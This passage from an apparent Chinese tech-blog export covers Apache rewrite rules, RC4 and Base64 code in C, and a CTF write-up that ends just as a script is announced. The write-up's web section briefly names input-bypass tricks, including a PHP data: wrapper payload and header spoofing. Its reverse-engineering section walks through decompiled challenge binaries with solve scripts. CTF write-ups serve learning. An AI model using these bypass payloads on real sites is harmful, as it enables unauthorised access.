1#LoadModule rewrite_module modules/mod_rewrite.so 前的’#’去掉。找到 ‘AllowOverride None’ 改成 ‘AllowOverride All’。 注：’AllowOverride’的参数设置为’ALL’，表示整台服务器上都支持URL规则重写。 对于不同的网址，需要在APACHE中增加如下内容： 123456&lt;Directory “E:/Apache Group/Apache2/htdocs/leapsoul”&gt;/*引号里代表你的web存放目录*//*如果是Linux，只要你定位到你网站目录即可*/Options FollowSymLinksAllowOverride None&lt;/Directory&gt; Apache 服务器要读每个网站下目录下的.htaccess文件。如果没有这个文件，或者这个文档没有定义任何关于URL重写的规则就不会有任何效果。 只要启用mod_rewrite，然后简单的通过一个.htaccess文件再加上一些简单的规则就可以移除URL中的 index.php 了。 针对整个apache服务器的配置在网站配置下加入 123RewriteEngine onRewriteRule index.html index.phpRewriteRule (d+).html$ info.php?id=$1 即通过index.html访问就是index.php；通过1.html访问就是info.php?id=1。 针对apache服务器下的某一目录的配置在.htaccess文件中加入 123RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !-f#这里将除了实际文件以为的所有其他请求都指向下行代码给出的脚本，这里是index.phpRewriteRule .* index.php 在Windows资源管理器里面不允许你建立.htaccess这样只有扩展名的文件。所以你必须先将文件保存为其他名字，例如app.htaccess。然后进入cmd，输入ren a.htaccess .htaccess命令来对文件改名。或者新建一个记事本，另存为.htaccess即可。 例子如果文件不存在重定向到404页面123RewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule .? /404.php [L] 这里-f匹配的是存在的文件名，-d匹配的存在的路径名。这段代码在进行404重定向之前，会判断你的文件名以及路径名是否存在【请注意这里】。你还可以在404页面上加一个?url=$1参数： 1RewriteRule ^/?(.*)$ /404.php?url=$1 [L] 域名跳转123RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^en.smilejay.com [NC]RewriteRule ^(.*) http://www.smilejay.com/ [L] 配置多用户虚拟服务器12345678910111213ServerAdmin webmaster@kiya.usDocumentRoot /home/www/www.kiya.usServerName dns.kiya.usServerAlias dns.kiya.us kiya.us *.kiya.usCustomLog /var/log/httpd/osa/access_log.log” commonErrorLog /var/log/httpd/osa/error_log.log”AllowOverride NoneOrder deny,allowRewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^[^.]+.kiya.(cn|us)$RewriteRule ^(.+) %&#123;HTTP_HOST&#125;$1 [C]RewriteRule ^([^.]+).kiya.(cn|us)(.*)$ /home/www/www.kiya.us/sylvan$3?un=$1&amp;%&#123;QUERY_STRING&#125; [L] 通过Rewrite防止盗链1234RewriteEngine OnRewriteCond %&#123;HTTP_REFERER&#125; chinaz.com [NC]RewriteCond %&#123;HTTP_REFERER&#125; im286.com [NC]RewriteRule .*\\.(jpg|jpeg|gif|png|rar|zip|txt|ace|torrent|gz|swf)$ http://www.xxx.com/fuck.png [R,NC,L] 屏蔽IE和Opera浏览器1234RewriteEngine onRewriteCond %&#123;HTTP_USER_AGENT&#125; ^MSIE [NC,OR]RewriteCond %&#123;HTTP_USER_AGENT&#125; ^Opera [NC]RewriteRule ^.* – [F,L] #这里&quot;-&quot;表示没有替换，浏览器为IE和Opera的访客将被禁止访问。 自动添加.php扩展名及自动换.html到.php扩展名1234567RewriteEngine OnRewriteBase /testRewriteCond %&#123;REQUEST_FILENAME&#125;.php -fRewriteRule ([^/]+)$ /test/$1.php#for example: /test/admin =&gt; /test/admin.phpRewriteRule ([^/]+)\\.html$ /test/$1.php [L]#for example: /test/admin.html =&gt; /test/admin.php 限制仅显示图片123456#限制目录只能显示图片&lt; IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond %&#123;REQUEST_FILENAME&#125; !^.*\\.(gif|jpg|jpeg|png|swf)$RewriteRule .*$ – [F,L]&lt; /IfModule&gt; 隐藏index.php12345678910Options +FollowSymLinksIndexIgnore */*RewriteEngine on# if a directory or a file exists, use it directlyRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-d# otherwise forward it to index.phpRewriteRule . index.php 1234RewriteEngine OnRewriteCond %&#123;REQUEST_FILENAME&#125; !-fRewriteCond %&#123;REQUEST_FILENAME&#125; !-dRewriteRule ^(.*)$ index.php/$1 [L] 参考网站：http://www.111cn.net/phper/apache/45642.htmhttp://smilejay.com/2012/10/apache-rewrite/https://www.cnblogs.com/zhenghongxin/p/6798310.htmlhttps://phperzh.com/articles/2922https://zybuluo.com/phper/note/73726","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"},{"name":"note","slug":"note","permalink":"https://qianfei11.github.io/tags/note/"}]},{"title":"C语言实现RC4加密解密算法","slug":"C语言实现RC4加密解密算法","date":"2018-05-13T02:47:11.000Z","updated":"2018-12-05T07:52:04.173Z","comments":true,"path":"2018/05/13/C语言实现RC4加密解密算法/","link":"","permalink":"https://qianfei11.github.io/2018/05/13/C语言实现RC4加密解密算法/","excerpt":"RC4于1987年提出，是一种对称加密算法，也就是说使用的密钥为单钥（或称为私钥）。RC4不是对明文进行分组处理，而是字节流的方式依次加密明文中的每一个字节，解密的时候也是依次对密文中的每一个字节进行解密。","text":"RC4于1987年提出，是一种对称加密算法，也就是说使用的密钥为单钥（或称为私钥）。RC4不是对明文进行分组处理，而是字节流的方式依次加密明文中的每一个字节，解密的时候也是依次对密文中的每一个字节进行解密。 RC4算法的特点是算法简单，运行速度快，而且密钥长度是可变的，可变范围为1-256字节(8-2048比特)，在如今技术支持的前提下，当密钥长度为128比特时，用暴力法搜索密钥已经不太可行，所以可以预见RC4的密钥范围任然可以在今后相当长的时间里抵御暴力搜索密钥的攻击。实际上，如今也没有找到对于128bit密钥长度的RC4加密算法的有效攻击方法。 RC4加密算法是一种对称加密算法。所谓对称加密算法，说得直白一点，就是加密与解密的过程一模一样。假设定义RC4的运算过程是rc4(key,data)，那么，密文=rc4(key,明文)，明文=rc4(key,密文)。所以，对一段数据迭代地做奇数次RC4运算，就得到密文，对这段数据迭代地做偶数次RC4运算，结果依旧是原来的那段数据。 rc4加密解密原理先介绍算法中的几个关键变量： 1、密钥流：RC4算法的关键是根据明文和密钥生成相应的密钥流，密钥流的长度和明文的长度是对应的，也就是说明文的长度是500字节，那么密钥流也是500字节。当然，加密生成的密文也是500字节，因为密文第i字节=明文第i字节^密钥流第i字节； 2、状态向量S：长度为256，S[0],S[1]…..S[255]。每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换； 3、临时向量T：长度也为256，每个单元也是一个字节。如果密钥的长度是256字节，就直接把密钥的值赋给T，否则，轮转地将密钥的每个字节赋给T； 4、密钥K：长度为1-256字节，注意密钥的长度keylen与明文长度、密钥流的长度没有必然关系，通常密钥的长度趣味16字节（128比特）。 利用Key生成S盒——The key-scheduling algorithm (KSA)密钥调度算法用于初始化数组S盒中的置换。 “keylength”被定义为密钥中的字节数，并且可以在1≤keylength≤256的范围内，通常在5和16之间，对应于40到128位的密钥长度。 首先，数组“S”被初始化为i。然后以类似于PRGA的方式对S进行256次迭代处理，同时也以密钥的字节为单位进行混合。 利用S盒生成密钥流——The pseudo-random generation algorithm(PRGA)对于需要的迭代次数，PRGA修改状态并输出一个字节的密钥流。 在每次迭代中，PRGA递增i，将i指向的S的值与j相加，交换S[i]和S[j]的值，然后在S[i]+S[j]（模256）。 每256个迭代，S的每个元素至少与另一个元素交换一次。 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 256void rc4_init(unsigned char *sbox, unsigned char *key, unsigned long len)&#123; int j = 0; char t[MAX] = &#123;0&#125;; unsigned char tmp = 0; for(int i = 0; i &lt; MAX; i++)//初始化算法 &#123; sbox[i] = i; t[i] = key[i % len]; &#125; for(int i = 0; i &lt; MAX; i++)//伪随机子密码生成算法 &#123; j = (j + sbox[i] + t[i]) % MAX; tmp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = tmp; &#125;&#125;unsigned char rc4_crypto(unsigned char *sbox, unsigned char *data, unsigned long len)&#123; int i = 0, j = 0; unsigned char tmp = 0; unsigned long k = 0; for(k = 0; k &lt; len; k++) &#123; i = (i + 1) % MAX; j = (j + sbox[i]) % MAX; tmp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = tmp; int t = (sbox[i] + sbox[j]) % MAX; data[k] ^= sbox[t]; &#125;&#125;int main()&#123; unsigned char s1[MAX] = &#123;0&#125;, s2[MAX] = &#123;0&#125;; char key[MAX] = &#123;0&#125;, data[2 * MAX] = &#123;0&#125;; printf(&quot;Please input the key:\\n&quot;); scanf(&quot;%s&quot;, key); printf(&quot;Please input the data:\\n&quot;); scanf(&quot;%s&quot;, data); unsigned long len = strlen(data); rc4_init(s1, (unsigned char *)key, strlen(key)); for(int i = 0; i &lt; MAX; i++) s2[i] = s1[i]; rc4_crypto(s1, (unsigned char *)data, len); printf(&quot;%s\\n&quot;, data); rc4_crypto(s2, (unsigned char *)data, len); printf(&quot;%s\\n&quot;, data); return 0;&#125; 参考网站：https://blog.csdn.net/white_idiot/article/details/65937877https://blog.csdn.net/lc_910927/article/details/37599161https://www.cnblogs.com/zibility/p/5404478.html","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://qianfei11.github.io/tags/crypto/"},{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"}]},{"title":"C语言实现Base64解密加密算法","slug":"C语言实现Base64解密加密算法","date":"2018-05-12T03:49:45.000Z","updated":"2018-12-05T07:52:10.812Z","comments":true,"path":"2018/05/12/C语言实现Base64解密加密算法/","link":"","permalink":"https://qianfei11.github.io/2018/05/12/C语言实现Base64解密加密算法/","excerpt":"Base64编码是将任何类型的数据转换成ASCII码的可见字符，然后接收端再反向解码，得到原始的数据。最早的的Base是用于发送Email内容的。","text":"Base64编码是将任何类型的数据转换成ASCII码的可见字符，然后接收端再反向解码，得到原始的数据。最早的的Base是用于发送Email内容的。 Base64实际上是一种基于64个可打印字符来表示二进制数据的表示方法。 经过Base64转换之后的数据大小变大了，为原数据的4/3大小。但是方便了传输，比如由于base64的编码中没有&lt;&gt;等特殊字符，可以不用转义扫描，直接放在XML中，放在MIME中，甚至直接不经过转义扫描存进数据库中。由于有这些方便的特性，即使数据量变大，base64编码还是被广泛使用。 编码原理每个字节8位，每次取出3个字节，也就是3 x 8 = 24 位。然后每次从此24位中取出6位，然后在前端补2位0，组成新的8位，也就是一个字节。这样就将3个字节转换成了4个字节。由于前面两位都是0，所以转换后的每个字节能表示的最大数字为63， 也就是说转换后的每个字节只可能是0-63中的一个数字。 然后根据规范给出的Base64索引表，将1-63 这64个数字转换成ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/中的一个。 当最后取出3个字节不够时，不够的位置补0，并且最后少一个字节时编码的最后加一个“=”，少两个字节时加两个”=”。 解码原理解码是编码的反向过程，每次取出4个字节，然后将每个字节的字符转换成原始Base64索引表对应的索引数字，也就是编码时3字节转换成4字节的转换结果。然后使用位操作将每字节前2位去掉，重新转换成3字节。需要注意的是最后对于结尾“=”的处理。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 100const char *base64payload = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;int find_pos(char c)&#123; for(int i = 0; i &lt; 65; i++) if(c == base64payload[i]) return i; return -1;&#125;unsigned char *base64_encode(const char *s, const int len)&#123; unsigned int sign = len % 3; unsigned int res_len = len % 3 ? ((len) / 3 + 1) * 4 : (len) / 3 * 4; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); for(i = 0, j = 0; i &lt; len; i += 3, j += 4) &#123; if(i + 2 &gt;= len) &#123; res[j] = (s[i] &gt;&gt; 2) &amp; 0x3F; if(sign == 1)//因为只多出一个数据，故需要补两个&apos;=&apos; &#123; res[j + 1] = ((s[i] &amp; 0x03) &lt;&lt; 4) &amp; 0x3F; res[j + 2] = 0x40;//0x40对应数字64，即为base64payload中下标为64的&apos;=&apos; res[j + 3] = 0x40; &#125; else if(sign == 2)//因为多出两个数据，故需要补一个&apos;=&apos; &#123; res[j + 1] = (((s[i] &amp; 0x03) &lt;&lt; 4) | ((s[i + 1] &gt;&gt; 4) &amp; 0x0F)); res[j + 2] = ((s[i + 1] &amp; 0x0F) &lt;&lt; 2) &amp; 0x3F; res[j + 3] = 0x40; break; &#125; &#125; res[j] = (s[i] &gt;&gt; 2) &amp; 0x3F;//取第一个字节的前六位，最高两位补零 res[j + 1] = (((s[i] &amp; 0x03) &lt;&lt; 4) | ((s[i + 1] &gt;&gt; 4) &amp; 0x0F));//取第一个字节的最后两位和第二个字节的前四位，最高两位补零 res[j + 2] = (((s[i + 1] &amp; 0x0F) &lt;&lt; 2) | ((s[i + 2] &gt;&gt; 6) &amp; 0x03));//取第二个字节的后四位和第三个字节的前两位，最高两位补零 res[j + 3] = (s[i + 2] &amp; 0x3F);//取第三个字节的最后六位，最高两位补零 &#125; for(j = 0; j &lt; res_len; j++) res[j] = base64payload[res[j]]; return res;&#125;unsigned char *base64_decode(const char *s, const int len)&#123; unsigned int res_len = len / 4 * 3; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); int count = len / 4; for(i = 0; i &lt; count; i++) &#123; int s_index = i * 4; int res_index = i * 3; int buffer[4];//四个字节一组存入 int sign = 0; for(j = 0; j &lt; 4; j++) buffer[j] = find_pos(s[s_index + j]); if(i == count - 1) for(j = 0; j &lt; 4; j++) if(buffer[j] == 0x40)//如果为&apos;=&apos;，sign的值加一 sign++; res[res_index] = ((buffer[0] &amp; 0x3F) &lt;&lt; 2 | (buffer[1] &amp; 0x30) &gt;&gt; 4); if(sign == 2) break; res[res_index + 1] = ((buffer[1] &amp; 0x0f) &lt;&lt; 4 | (buffer[2] &amp; 0x3C) &gt;&gt; 2); if(sign == 1) break; res[res_index + 2] = ((buffer[2] &amp; 0x03) &lt;&lt; 6 | (buffer[3] &amp; 0x3F)); &#125; return res;&#125;int main()&#123; unsigned char s1[MAX]; scanf(&quot;%s&quot;, s1); unsigned char *s2 = base64_encode((const char *)s1, strlen((const char *)s1)); printf(&quot;%s\\n&quot;, s2); unsigned char *s3 = base64_decode((const char *)s2, strlen((const char *)s2)); printf(&quot;%s\\n&quot;, s3); free(s2); free(s3); return 0;&#125; 通过对base64的实现，熟悉了几个位运算符，对二进制的认识更清晰了一些。 参考网站：https://blog.csdn.net/irwin_chen/article/details/9360845http://www.cppblog.com/izualzhy/archive/2012/07/19/184222.htmlhttp://www.cppblog.com/izualzhy/archive/2012/07/20/184311.html","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://qianfei11.github.io/tags/crypto/"},{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"}]},{"title":"2018-ZJGSCTF-writeup","slug":"2018-ZJGSCTF-writeup","date":"2018-05-07T04:06:41.000Z","updated":"2019-02-03T10:19:06.587Z","comments":true,"path":"2018/05/07/2018-ZJGSCTF-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/","excerpt":"第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。","text":"第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。 WEB奇淫技巧第一关，md5碰撞。 第二关，数组绕过。 第三关，%00截断。 第四关，PHP伪协议data:text/plain,&lt;?php phpinfo()?&gt;。（附上大佬博客） 送分的点击flag in here后，跳转到另一个网站，提示为非法源无法访问。 想到X-Forwarded-For和Referer，经过尝试得到flag。 给你的小世界打开网站先欣赏一遍精彩的小故事，然后查看源码，得到提示。 第一段字母显然是base64，然后根据解码后得到的提示分别base32、base16解密得到flag。 RERE这块主要是复现。 签到题发现题目打不开，原来是文本文件，有一段C代码和汇编组成。 可以判断下面的汇编代码就是函数ck1()的汇编形式。具体操作也很容易看出： 12345678910111213.text:0040104A loc_40104A: ; CODE XREF: ck1+1F↑j.text:0040104A mov ecx, [ebp+var_4].text:0040104D cmp ecx, [ebp+arg_4].text:00401050 jge short loc_40106B.text:00401052 mov edx, [ebp+arg_0].text:00401055 add edx, [ebp+var_4].text:00401058 movsx eax, byte ptr [edx].text:0040105B xor eax, 30h.text:0040105E add eax, 1.text:00401061 mov ecx, [ebp+arg_0].text:00401064 add ecx, [ebp+var_4].text:00401067 mov [ecx], al.text:00401069 jmp short loc_401041 可以看到就是把enc字符串中的每个字符分别和0x30异或后再加一。 加密脚本（实际上就是填充函数ck1()的内容）如下： 1234567891011#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char enc[37]=\"\\x55\\x5b\\x50\\x56\\x4a\\x66\\x54\\x5b\\x52\\x5e\\x5c\\x54\\x6e\\x43\\x1f\\x6e\\x41\\x54\\x6e\\x43\\x57\\x58\\x42\\x6e\\x58\\x42\\x6e\\x5e\\x5d\\x5b\\x48\\x6e\\x50\\x42\\x5c\\x4c\"; for(int i = 0; i &lt; strlen(enc); i++) &#123; enc[i] ^= 0x30; enc[i] += 1; &#125; printf(\"%s\\n\",enc); return 0;&#125; babyre这题涉及到ida的一个小技巧patch，通过看雪上的一篇文章了解了一下。f5发现不行，显示栈不平衡，需要patch。 先根据提示找到出错的位置。在option中勾选显示栈指针。然后再找到距离ret最近的call，然后修改栈指针的值。 成功f5后审计代码： 1234567891011121314151617181920212223242526272829303132333435int __cdecl main(int argc, const char **argv, const char **envp)&#123; const char *enc1; // esi signed int v4; // eax int v5; // esi char sbox; // [esp+Ch] [ebp-238h] char Dst; // [esp+Dh] [ebp-237h] char key; // [esp+10Ch] [ebp-138h] char v10; // [esp+12Eh] [ebp-116h] char input[52]; // [esp+20Ch] [ebp-38h] sbox = 0; memset(&amp;Dst, 0, 0xFFu); strcpy(&amp;key, \"flag&#123;this_is_not_the_flag_hahaha&#125;\"); memset(&amp;v10, 0, 0xDEu); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 33 ) &#123; enc1 = base64encypt(input); rc4_init(&amp;sbox, (int)&amp;key, strlen(&amp;key)); rc4_crypto((int)&amp;sbox, (int)enc1, strlen(enc1)); v4 = 0; v5 = enc1 - flag; do &#123; if ( flag[v5 + v4] != flag[v4] ) exit(0); ++v4; &#125; while ( v4 &lt; 44 ); printf(\"Congratulation!!!!!!\\n\"); &#125; return 0;&#125; 经过对代码的审计，判断出先对输入字符串进行了base64加密，然后再通过rc4加密。在内存中分别找到base64的表以及被加密的flag。 用python2中的pycrypto（使用方法：from Crypto.Cipher）进行rc4的加解密；用base64库进行base64加解密。脚本如下： 123456789101112131415161718from Crypto.Cipher import ARC4import base64import stringprint '-----------------ARC4-----------------'key = 'flag&#123;this_is_not_the_flag_hahaha&#125;'flag = '\\x20\\xC3\\x1A\\xAE\\x97\\x3C\\x7A\\x41\\xDE\\xF6\\x78\\x15\\xCB\\x4B\\x4C\\xDC\\x26\\x55\\x8B\\x55\\xE5\\xE9\\x55\\x75\\x40\\x3D\\x82\\x13\\xA5\\x60\\x13\\x3B\\xF5\\xD8\\x19\\x0E\\x47\\xCF\\x5F\\x5E\\xDE\\x9D\\x14\\xBD'enc1 = ARC4.new(key).decrypt(flag)print enc1print '----------------base64----------------'replaced = ''Base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'table = 'ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/'for ch in enc1: if ch in Base64: replaced += Base64[string.find(table, str(ch))] elif ch == '=': replaced += '='print base64.b64decode(replaced) New driver拖进OD一运行就退出了。拖进ida发现有tls反调试： 用PEview查看exe中相关PE结构，然后在010editor中将对应部分的value清零： 除去tls后查壳发现有upx。脱去后放进ida： 123456789101112131415161718int main_0()&#123; HANDLE thread_2; // [esp+D0h] [ebp-14h] HANDLE thread_1; // [esp+DCh] [ebp-8h] j_read_input(); hObject = CreateMutexW(0, 0, 0); j_strcpy(Dest, Source); thread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)one, 0, 0, 0); thread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)two, 0, 0, 0); CloseHandle(thread_1); CloseHandle(thread_2); while ( dword_418008 != -1 ) ; j_print_dest(); CloseHandle(hObject); return 0;&#125; 一开始读取输入字符串，中间创建了两个线程，然后最后与被加密的flag进行比较以及输出flag。回去看两个线程发现第二个线程没干什么事，主要是第一个线程进行了加密。其中加密函数的sp指针不平衡，需要修改指针值。修改后，进入函数： 1234567891011121314151617181920char **__cdecl encrypt(char *input, int index)&#123; char **result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = input[index]; if ( (v3 &lt; 'a' || v3 &gt; 'z') &amp;&amp; (v3 &lt; 'A' || v3 &gt; 'Z') ) exit(0); if ( v3 &lt; 'a' || v3 &gt; 'z' ) // lower case &#123; result = (char **)table; input[index] = table[input[index] - 38]; &#125; else // upper case &#123; result = (char **)table; input[index] = table[input[index] - 96]; &#125; return result;&#125; 对每个字符大小写进行了判断，然后减法操作。还有一点是两个线程每次循环分别都sleep了100s，那么依次循环就会造成奇偶依次加密。solve脚本： 12345678910111213table = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'enc = [0x54, 0x4F, 0x69, 0x5A, 0x69, 0x5A, 0x74, 0x4F, 0x72, 0x59, 0x61, 0x54, 0x6F, 0x55, 0x77, 0x50, 0x6E, 0x54, 0x6F, 0x42, 0x73, 0x4F, 0x61, 0x4F, 0x61, 0x70, 0x73, 0x79, 0x53, 0x79]flag = ''for i in range(len(enc)): if i % 2 == 0: flag += chr(enc[i]) else: idx = table.index(chr(enc[i])) if idx &gt; 26: # lower case flag += chr(idx + 38) else: # upper case flag += chr(idx + 96)print 'flag:', flag Old driver32位exe文件，拖进ida后，除了判断了字串长度为40和前后缀的check，还发现函数被加密了： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)dword_401000; ++i ) *((_BYTE *)dword_401000 + i) ^= 0xBBu; v9 = 32123; v8 = 1734437990; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); ((void (__fastcall *)(int, char *))loc_4010B0)(i, input); &#125; return 0;&#125; 可以用IDAPython来patch一下： 123456from ida_bytes import *start_addr = 0x00401000end_addr = 0x00401260for i in range(start_addr, end_addr, 4): tmp = get_bytes(i, 1) patch_bytes(i, chr(ord(tmp) ^ 0xbb)) 或者用Ollydbg把解密过后的程序dump出来。找到加密过后的位置设下断点，断下来之后dump即可（注意前面还需要过一个长度的check）： 把dump出来的程序拖进ida： 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; int i; // ecx signed int j; // eax char input[39]; // [esp+0h] [ebp-40h] char v7; // [esp+27h] [ebp-19h] int v8; // [esp+34h] [ebp-Ch] __int16 v9; // [esp+38h] [ebp-8h] char v10; // [esp+3Ah] [ebp-6h] input[0] = 0; memset(&amp;input[1], 0, 0x31u); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 40 ) &#123; for ( i = 0; i &lt; (char *)nullsub_1 - (char *)maze_solve; ++i ) *((_BYTE *)maze_solve + i) ^= 0xBBu; v9 = '&#125;&#123;'; v8 = 'galf'; v10 = 0; j = 0; do &#123; if ( input[j] != *((_BYTE *)&amp;v8 + j) ) goto LABEL_8; ++j; &#125; while ( j &lt; 5 ); LOBYTE(i) = v7; if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8: exit(0); base64(i, input); &#125; return 0;&#125; 进入加密函数后，先是对六位异或，然后base64几位字符，最后走个maze。solve脚本： 123456789101112131415161718192021import base64flag = 'flag&#123;'enc1 = [0xF2, 0xEE, 0xEF, 0xF5, 0xD9, 0xEF]for i in range(len(enc1)): flag += chr(enc1[i] ^ 0x86)enc2 = 'z91c'[::-1] + 'fNWb'[::-1]flag += base64.b64decode(enc2)# maze# --------# g + +# + + ++ +# + + #+ +# + ++++ +# + ++++ +# + +# --------# 'a'-down '2'-up 'q'-left 'w'-rightpath = 'waaaaawwwww22222qqaaw'flag += pathflag += '&#125;'print 'flag:', flag 秋名山车神12$ file re5 re5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1c630722da16df2163ff83ea21cce93bf6b71a87, not stripped 32位elf拖进ida查看： 123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+0h] [ebp-2F0h] char m_t; // [esp+80h] [ebp-270h] char matrix; // [esp+180h] [ebp-170h] char input; // [esp+282h] [ebp-6Eh] int pipes[2]; // [esp+2C8h] [ebp-28h] __pid_t pid; // [esp+2D0h] [ebp-20h] size_t length; // [esp+2D4h] [ebp-1Ch] int *v11; // [esp+2E4h] [ebp-Ch] v11 = &amp;argc; length = 0; memset(&amp;v4, 0, 0x80u); puts(\"input flag:\"); __isoc99_scanf(); length = strlen(&amp;input); if ( length != 64 ) return 0; if ( pipe(pipes) &lt; 0 ) exit(1); pid = fork(); if ( pid &lt; 0 ) exit(1); if ( pid &lt;= 0 ) // children process &#123; close(pipes[1]); read(pipes[0], &amp;input, length); ck2((char **)&amp;matrix, &amp;input); ck3((char **)key_matrix, (char **)&amp;matrix, (int)&amp;m_t, 8, 8, 8); if ( ck4((int)&amp;m_t) ) printf(\"Congratulate!!!\"); &#125; else // father process &#123; close(pipes[0]); ck1(&amp;input, length); write(pipes[1], &amp;input, length); wait(0); &#125; return 0;&#125; main函数中主要是先读取一个字符串，如果长度不为64则退出。之后fork了一个子进程，然后新建一个pipe，在父进程把字符串输入pipe，经过ck1()之后送到pipe里；子进程从pipe读取字符串，经过ck2()和ck3()后，在ck4()里判断。下面一个个分析。 ck1()是rot13加密： 12345678910111213141516171819202122232425262728293031int __cdecl ck1(char *input, int length)&#123; int result; // eax char v3; // [esp+Bh] [ebp-5h] int i; // [esp+Ch] [ebp-4h] for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= length ) break; v3 = input[i] + 13; if ( input[i] &lt;= 96 || input[i] &gt; 122 ) &#123; if ( input[i] &lt;= 64 || input[i] &gt; 90 ) &#123; v3 = input[i]; &#125; else if ( (unsigned __int8)v3 &gt; 0x5Au ) &#123; v3 = input[i] - 13; &#125; &#125; else if ( (unsigned __int8)v3 &gt; 0x7Au ) &#123; v3 = input[i] - 13; &#125; input[i] = v3; &#125; return result;&#125; ck2()这里把输入的字符串转化成8x8的矩阵： 123456789101112131415161718192021222324signed int __cdecl ck2(char **m, char *input)&#123; signed int result; // eax int v3; // eax char *v4; // edx int v5; // [esp+4h] [ebp-Ch] signed int i; // [esp+8h] [ebp-8h] signed int j; // [esp+Ch] [ebp-4h] result = 134520832; v5 = 0; for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; v3 = v5; v5 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[4290763520] + 1; v4 = (char *)input[v3]; result = j; (&amp;m[8 * i])[j] = v4; &#125; &#125; return result;&#125; ck3()将输入的矩阵与一个global的矩阵key相乘： 123456789101112131415161718192021222324252627int __cdecl ck3(char **key, char **input, char **a3, int a4_8, int a5_8, int a6_8)&#123; int result; // eax int m; // [esp+4h] [ebp-10h] int i; // [esp+8h] [ebp-Ch] int k; // [esp+8h] [ebp-Ch] int j; // [esp+Ch] [ebp-8h] int l; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt; a5_8; ++i ) &#123; for ( j = 0; j &lt; a4_8; ++j ) (&amp;a3[8 * i])[j] = 0; &#125; for ( k = 0; ; ++k ) &#123; result = k; if ( k &gt;= a5_8 ) break; for ( l = 0; l &lt; a4_8; ++l ) &#123; for ( m = 0; m &lt; a6_8; ++m ) (&amp;a3[8 * k])[l] = &amp;(&amp;a3[8 * k])[l][(_DWORD)(&amp;key[8 * k])[m] * (_DWORD)(&amp;input[8 * m])[l]]; &#125; &#125; return result;&#125; 最后的ck4()将输出的矩阵与global的enc_flag进行比较： 123456789101112131415signed int __cdecl ck4(char **m)&#123; signed int i; // [esp+8h] [ebp-Ch] signed int j; // [esp+Ch] [ebp-8h] for ( i = 0; i &lt;= 7; ++i ) &#123; for ( j = 0; j &lt;= 7; ++j ) &#123; if ( (&amp;m[8 * i])[j] != *(char **)&amp;enc_flag[4 * (8 * i + j)] ) return 0; &#125; &#125; return 1;&#125; 主要用numpy，可以比较方便地实现矩阵间的运算。脚本如下： 